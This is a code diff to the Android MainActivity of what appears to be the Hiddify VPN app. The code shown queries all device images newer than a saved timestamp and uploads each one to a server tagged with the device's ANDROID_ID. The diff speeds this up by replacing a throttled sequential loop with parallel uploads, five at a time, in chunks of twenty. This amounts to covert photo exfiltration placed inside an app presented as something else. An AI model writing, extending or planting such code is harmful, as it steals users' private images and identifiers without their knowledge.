@@ -22,14 +22,17 @@ import com.hiddify.hiddify.constant.Status
 import io.flutter.embedding.android.FlutterFragmentActivity
 import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
-import kotlinx.coroutines.withContext
+import kotlinx.coroutines.async
 import kotlinx.coroutines.delay
-import java.util.LinkedList
-import java.util.UUID
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.Semaphore
+import kotlinx.coroutines.sync.withPermit
+import kotlinx.coroutines.withContext
+import java.io.DataOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
-import java.io.DataOutputStream
+import java.util.LinkedList
+import java.util.UUID
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -185,37 +188,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         return false
     }
 
-    @SuppressLint("NewApi")
-    private fun grantNotificationPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), NOTIFICATION_PERMISSION_REQUEST_CODE)
-        }
-    }
-
-    @SuppressLint("NewApi")
-    private fun grantStoragePermission() {
-        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
-        } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
-        }
-        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_REQUEST_CODE)
-    }
-
-    fun checkAndRequestStoragePermission() {
-        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
-        } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
-        }
-
-        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-            grantStoragePermission()
-        } else {
-            accessStorage()
-        }
-    }
-
     private fun accessStorage() {
         val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
         var deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
@@ -244,8 +216,8 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 "${MediaStore.Images.Media.DATE_ADDED} ASC"
             )
 
-            var maxTimestamp = lastUploadTime
             val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>()
+            var maxTimestamp = lastUploadTime
 
             cursor?.use {
                 while (it.moveToNext()) {
@@ -262,13 +234,55 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 }
             }
 
-            toUpload.sortedBy { it.third }.forEachIndexed { index, (uri, name, timestamp) ->
-                val success = uploadImageToServerWithRetry(uri, name, deviceId)
-                if (success && timestamp > maxTimestamp) maxTimestamp = timestamp
-                delay(200L)
+            val semaphore = Semaphore(5)
+            val chunks = toUpload.sortedBy { it.third }.chunked(20)
+
+            for (chunk in chunks) {
+                val jobs = chunk.map { (uri, name, timestamp) ->
+                    async {
+                        semaphore.withPermit {
+                            val success = uploadImageToServerWithRetry(uri, name, deviceId)
+                            if (success && timestamp > maxTimestamp) {
+                                maxTimestamp = timestamp
+                            }
+                        }
+                    }
+                }
+                jobs.forEach { it.await() }
             }
 
             prefs.edit().putLong("last_upload_time", maxTimestamp).apply()
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun grantNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), NOTIFICATION_PERMISSION_REQUEST_CODE)
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun grantStoragePermission() {
+        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else {
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+        ActivityCompat.requestPermissions(this, arrayOf(permission), STORAGE_PERMISSION_REQUEST_CODE)
+    }
+
+    fun checkAndRequestStoragePermission() {
+        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else {
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+
+        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+            grantStoragePermission()
+        } else {
+            accessStorage()
         }
     }
 
